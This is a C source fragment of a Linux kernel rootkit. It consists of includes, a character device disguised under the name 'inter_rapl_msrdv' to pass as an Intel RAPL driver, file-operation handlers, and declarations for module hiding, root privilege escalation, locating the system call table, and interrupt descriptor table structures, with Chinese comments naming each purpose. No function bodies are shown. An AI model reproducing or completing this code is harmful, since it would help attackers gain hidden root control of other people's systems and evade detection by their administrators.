#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>

#define DEVICE_NAME "inter_rapl_msrdv"
#define CLASS_NAME "inter_rapl_msrmd"
#define DEVICE_PATH "/dev/inter_rapl_msrdv"

static int major_num;
static struct class *module_class = NULL;
static struct device *module_device = NULL;
static struct file *__file = NULL;
struct inode *__inode = NULL;

static int rootkit_open(struct inode *, struct file *);
static int rootkit_release(struct inode *, struct file *);
static ssize_t rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static long rootkit_ioctl(struct file *, unsigned int, unsigned long);

static struct file_operations rootkit_fo = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = rootkit_ioctl,
    .read = rootkit_read,
    .open = rootkit_open,
    .release = rootkit_release,
    .write = rootkit_write};

static struct list_head *prev;

// 模块隐藏
static void __init hide_myself(void);

// 提升权限
void get_root(void);

// 寻找系统调用表地址
static void disp_sys_call_table(void);

// 中断描述符表寄存器结构
struct
{
    unsigned short limit;
    unsigned int base;
} __attribute__((packed)) idtr;

// 中断描述符表结构
struct
{
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__((packed)) idt;

// 模块加载、卸载函数声明
static int __init rootkit_init(void);
static void __exit rootkit_exit(void);
